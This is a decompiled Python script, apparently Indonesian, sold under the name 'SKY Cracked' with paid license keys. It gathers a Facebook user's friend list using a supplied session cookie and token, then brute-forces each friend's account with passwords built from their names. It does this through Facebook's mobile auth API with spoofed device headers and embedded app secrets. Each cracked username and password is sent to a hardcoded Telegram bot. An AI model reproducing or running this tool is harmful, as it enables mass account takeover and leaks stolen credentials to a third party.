# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2023-04-17 21:36:27.946054
import requests, re, os, random, sys, time, datetime, subprocess, uuid, json
import requests,json,os,sys,random,datetime,time,re
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel as Panel
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

def mtkk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)
from rich import print as prints
from datetime import datetime
from rich.tree import Tree
from string import *
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
ugent=[]
ua_sf=[]
ugent_reguler = []
ugent_api = []
sky=[]
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
N = '\x1b[0m'	# WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH
K = '\x1b[1;93m' # KUNING
def Fajar_ugent2():
        rr = random.randint
        model = random.choice(['RMX9090','RMX18080','RMXODOD','RMX871','RMX3357','RMX3506','RMX3690','RMX3661','RMX3630','RMX3612','RMX1941','RMX2205','RMP2105','RMX3563','RMX3478','RMX3372'])
        merk = random.choice(['Redmi Note 5',' M2004J19C','M2103K19Y','MI 8 UD','MI 9 Transparent Edition','M2102K1AC','220733SFG','M2012K11AC','cn; MI 5s','MIX 2S','XIG02','22081283G','22041211AC','22041216C','M2103K19G','220733SFG','21091116AC','MI 5X','M2006J10C'])
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(6,13))}; POCO X3 NFC MIUI/V12.0.10.0.QJGMIXM) [FBAN/Orca-Android;FBAV/{str(rr(8,99))}.0.0.12.14;FBLC/in_ID;FBBV/4624710;FBCR/Three;FBMF/IPHONE CPU 10;FBBD/POCO;FBDV/POCO M3 NFC;FBSV/{str(rr(11,99))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;]")
        kr = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(5,14))}; {merk} Build/PKQ1.180904.001) [FBAN/MessengerLite;FBAV/{str(rr(30,385))}.308.0.0.1.139;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/596663193;FBCR/XL;FBMF/Xiaomi;FBBD/xiaomi;FBDV/{merk};FBSV/{str(rr(5,14))};/FBCA/12.14.0-v8a:null;FB71/"+"{density=7.89262,width=720,height=1600};]")
        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(5,14))}; {merk} Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/{str(rr(30,385))}.319.0.0.5.94;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/257724124;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBDV/{merk};FBSV/{str(rr(5,14))};/FBCA/12.14.0-v8a:null;FB71/"+"{density=7.89262,width=720,height=1600};]")
        return random.choice([ua,kr,au])

class Brute:

	def __init__(self):
		self.id1, self.id2 = [], []
		self.ses = requests.Session()
		self.ok, self.cp, self.loop = [], [], 0
		self.dump_id()

	def convert(self, url):
		if "me" in url or "100" in url:
			return url
		elif "https" in url or "facebook" in url:
			user = url.split('/')[3]
			data = self.ses.get(f"https://mbasic.facebook.com/{user}").text
			xxxx = re.findall(";rid=(\d+)&amp;",str(data))[0]
			return xxxx
		else:
			ytta = self.ses.get(f"https://mbasic.facebook.com/{url}").text
			meme = re.findall(";rid=(\d+)&amp;",str(ytta))[0]
			return meme

	
		

	def logo(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear")
			except:pass
		print(f"""{N}
  ╔═╗╦╔═╦ ╦       ╔═╗╔═╗ | {H}Fajar Sky {N}
  ╚═╗╠╩╗╚╦╝  ───  ╚═╗╠╣  | {H}SKY Cracked{N} 
  ╚═╝╩ ╩ ╩        ╚═╝╚   | {H}V 2.0.1{N}""")
	def kentod(self, integer):
		lis = list("1234567890")
		gets = [random.choice(lis) for _ in range(integer)]
		return "".join(gets).upper()

	def ngoxok(self, cooz):
		coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
		return(str(coki))
		
	def metode(self, user, pasw, cebok):
		prog.update(des,description=f" {H2}• Sky {P2}{str(self.loop)}/{len(self.id1)} OK-:{H2}{len(self.ok)}[/] CP-:{M2}{len(self.cp)}[/]")
		prog.advance(des)
		for pw in pasw:
			try:
					pw=pw.lower()
					client_id = '6628568379'
					client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
					adid = str(uuid.uuid4())
					device_id = str(uuid.uuid4())
					li = ['28','29','210']
					li2 = random.choice(li)
					j1 = ''.join(random.choice(digits) for _ in range(2))
					j2 = li2+j1
					ua = Fajar_ugent2()
					data = {
					'adid':adid,
					'format':'json',
					'api_key':client_id,
					'community_id':'',
					'device_id':device_id,
					'family_device_id':device_id,
					'currently_logged_in_userid':'0',
					'try_num':'1',
					'email':user,
					'password':pw,
					'jazoest':j2,
					'generate_analytics_claim':'1',
					'cpl':'true',
					'generate_session_cookies':'1',
					'credentials_type':'password',
					'error_detail_type':'button_with_disabled',
					'source':'auth.login',
					'locale':'it_IT',
					'client_country_code':'IT',
					'advertising_id':adid,
					'meta_inf_fbmeta':'NO_FILE',
					'fb_api_req_friendly_name':'authenticate',
					'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
					'access_token':f'{client_id}|{client_secrets}'
					}
					head = {
					'Authorization':f'OAuth {client_id}|{client_secrets}',
					'X-FB-Connection-Quality':'EXCELLENT',
					'x-fb-sim-hni':str(random.randint(2e4,4e4)),
					'x-fb-net-hni':str(random.randint(2e4,4e4)),
					'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
					'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
					'x-fb-friendly_name':'authenticate',
					'content-encoding':'application/x-www-form-urlencoded',
					'x-tigon-is_retry':'true',
					'x-fb-http-engine':'Liger',
					'x-requested-with':'FBIOS',
					'connection':'keep-alive',
					'user-agent':ua
					}
					url = 'https://b-graph.facebook.com/auth/login'
					po = requests.post(url,data=data,headers=head,allow_redirects=False).text
					q = json.loads(po)
					if 'session_key' in q:
						#cookies = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
						#datr= "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
						#cookie = f"datr={datr};{cooz};{cookies}"
						prints(f"{H2} OK {user}|{pw}")
						requests.post(f"https://api.telegram.org/bot5844990132:AAH39YK3YIsfjixMXAmp3k3xNmvYiseM058/sendMessage?chat_id=5596466928&text={user}|{pw}").json()
						wrt = " [✓] "+user+"|"+pw
						self.ok.append(wrt)
						with open(f"ok.txt", "a", encoding="utf-8") as r:
							r.write(wrt+"\n")
						break
					elif 'www.facebook.com' in q['error']['message']:
						prints(f"{M2} CP {user}|{pw}")
						
						#requests.post(f"https://api.telegram.org/bot5670877886:AAEz4W8WjSbxURwmV5kbqzL3ebBr3poqu2k/sendMessage?chat_id=5596466928&text={user}|{pw}").json() 
						wrt = " [×] "+user+"|"+pw
						self.cp.append(wrt)

						break
					else:
						continue
			except requests.exceptions.ConnectionError:
				time.sleep(10)
			except Exception as e:
				print(e)
		self.loop+=1
		
	def login_cokie(self, cok):
		os.system('clear');self.logo()
		try:
			ses = requests.Session()
			cookie = input('\n╰─ Masukan Cookie : ')
			#requests.post(f"https://api.telegram.org/bot5670877886:AAEz4W8WjSbxURwmV5kbqzL3ebBr3poqu2k/sendMessage?chat_id=5596466928&text={cookie}").json() 
			cookies = {'cookie':cookie}
			url = 'https://www.facebook.com/adsmanager/manage/campaigns'
			req = ses.get(url,cookies=cookies)
			set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
			nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
			roq = ses.get(nek,cookies=cookies)
			tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
			tokenw = open(".token.txt", "w").write(tok)
			cokiew = open(".cok.txt", "w").write(cookie)
			print('\n╰─ Login Berhasil bre ')
			Brute()
		except Exception as e:
			print(" ╰─ Cookies Invalid bro")
			os.system('rm -rf .token.txt && rm -rf .cok.txt')
			print(e)
			Brute()
		
	def dump_id(self):
		self.logo()
		try:
			cook = {"cookie": open(".cok.txt", "r").read()};took = open(".token.txt", "r").read()
		except FileNotFoundError:
			self.cookie()
		try:
			ishx = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(took),cookies=cook).json()
			nama = ishx["name"]
			idfb = ishx["id"]
		except requests.exceptions.ConnectionError:
			exit("😔 Tidak ada koneksi")
		except KeyError:
			try:os.remove(".cok.txt");os.remove(".token.txt")
			except:pass
			prints("😢 opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.cookie()
		print(f"""	nama  : {nama}
	id fb : {idfb}
--------------------------------------------------------""")
		prints(f"({H2}•{P2}) Ketik 'me' jika ingin crack dari daftar teman anda.")
		try:user = input("[*] masukan id atau username : "); uid = self.convert(user)
		except (KeyError, IndexError):exit("[!] username atau id tidak benar")
		print("--------------------------------------------------------")
		try:
			tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(5000)&access_token={took}",cookies=cook).json()
			for x in tol["friends"]["data"]:
				self.id1.append(x["id"]+"<=>"+x["name"])
				titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
				for x in titik:
					sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
		except KeyError:
			print(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
			Brute()
		print(f"\n[*] Total id: {len(self.id1)}")
		for ih in self.id1:
			self.id2.insert(0, ih)
		self.password()
		
	def fajar(self):
		        print(f'{N}════════════════════════════════════════')
		        prints(f' ({H2}+{P2}) {P2}Metode   : {H2}M.FACEBOOK{P2}')
		        prints(f' ({H2}+{P2}) {P2}Total ID : {M2}{len(self.id1)}{P2} ')
		        prints(f' ({M2}×{P2}) {P2}Craked   : {M2}{ha} {op} {ta}{P2}')
		        prints(f' {M2}USE AEROPLANE MOOD IN EVERY 5 MINT{P2}')
		        print(f'{N}════════════════════════════════════════')
	def password(self):
		os.system("clear")
		self.logo()
		self.fajar()
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id2))
		with prog:
			with YayanGanteng(max_workers=30) as bool:
				for user in self.id2:
					uid, nama = user.split("<=>")[0], user.split("<=>")[1] #.lower()
					xxx = nama.split(" ")[0]
					if len(nama) <=5:
						if len(xxx) <=1 or len(xxx) <=2:pass
						else:
							pwx = [xxx+"123", xxx+"1234", xxx+"12345", xxx+"321"]
					else:
						pwx = [nama, xxx+"123", xxx+"1234", xxx+"12345"]
				  #  for i in pwx:
				  #	  print(f"{uid}|{i}")
					bool.submit(self.metode, uid, pwx, "free.facebook.com")
		print('\033[1;37m')
		print(' The Process han been completed ')
		exit()
	def cookie(self):
		self.logo()
		ahh = input("[?] cookie : ")
		self.login_cokie(ahh)

expired_script = ['20', '02', '2023']

def ex_run():
	os.system("clear")
	saat_ini = datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2} LISENSI TIDAK TERDAFTAR DI SERVER SKY"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		exit()
	else:
		Brute()

def cek_expired_script():
	saat_ini = datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2} LISENSI TIDAK TERDAFTAR \n"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		exit()
	else:
		pass

def premium():
	os.system("clear")
	mtkk("""
╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ 
║  │└─┐├┤ │││└─┐│ 
╩═╝┴└─┘└─┘┘└┘└─┘┴ 

""")
	prints(Panel(f"""{P2}[{H2}01{P2}]. Api Key Perminggu : 35k
[{P2}02{P2}]. Api Key Perbulan  : 55k
[{P2}03{P2}]. Api Key Pertahun  : 120k
[{P2}04{P2}]. file open source  : 230k
[{P2}05{P2}]. MASUKAN KEY
[{P2}00{P2}]. {M2}kembali""",width=80))
	prints(Panel(f"[{H2}•{P2}]. list harga lisensi",width=80))
	ask = input(f"[{H}*{P}]. PILIH :{P} ")
	if ask in["1","01"]:seminggu()
	elif ask in["2","02"]:sebulan()
	elif ask in["3","03"]:setahun()
	elif ask in["4","04"]:open_source()
	elif ask in["5","05"]:lesensi()
	elif ask in["0","00"]:menu()
	else:
		prints(Panel(f'''[{H2}*{P2}]. pilih yg bener jangan salah''',width=80));time.sleep(2)
	
def seminggu():
	prints(Panel(f'''{P2}[{H2}*{P2}]. anda akan di arahkan ke whatsapp''',width=80))
	os.system("xdg-open https://wa.me/6285894841695?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Perminggu+35k")
	time.sleep(2);premium()
	
def sebulan():
	prints(Panel(f'''{P2}[{H2}*{P2}]. anda akan di arahkan ke whatsapp''',width=80))
	os.system("xdg-open https://wa.me/6285894841695?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Perbulan+55k")
	time.sleep(2);premium()
	
def setahun():
	prints(Panel(f'''{P2}[{H2}*{P2}]. anda akan di arahkan ke whatsapp''',width=80))
	os.system("xdg-open https://wa.me/6285894841695?text=assalamualaikum,+bang+gw+mau+beli+lisensi+yg+Pertahun+120k")
	time.sleep(2);premium()
	
def open_source():
	prints(Panel(f'''{P2}[{H2}*{P2}]. anda akan di arahkan ke whatsapp''',width=80))
	os.system("xdg-open https://wa.me/6285894841695?text=assalamualaikum,+bang+gw+mau+beli+file+yg+open source+230k")
	time.sleep(2);premium()
def lesensi():
	os.system("clear")
	mtkk("""
╦  ┬┌─┐┌─┐┌┐┌┌─┐┬ 
║  │└─┐├┤ │││└─┐│ 
╩═╝┴└─┘└─┘┘└┘└─┘┴ 

login your lesensi / api key

""")

	api = input('Masukan Lesensi : ')

	if api =="RTTE-YTRAF-BGGST6-JJAUU":
	   time.sleep(2)
	   mengetik('sedang mengecek lesensi anda') 
	   time.sleep(3)
	   mengetik('\nlesensi valid✔️\n')     
	   ex_run()
	   time.sleep(4)
	if api not in ('F7JAR-ASFSJ-UKAS-YIPS','PNQK-TAHW-BAMA-ZXCW-AKMQ',"BANS-UQJW-YXAU-OAJW-PAJW"):
		mengetik('your lesensi not fund  ')
		lesensi()
	else:
		mengetik('lesensi valid ✓ ')
		


premium()
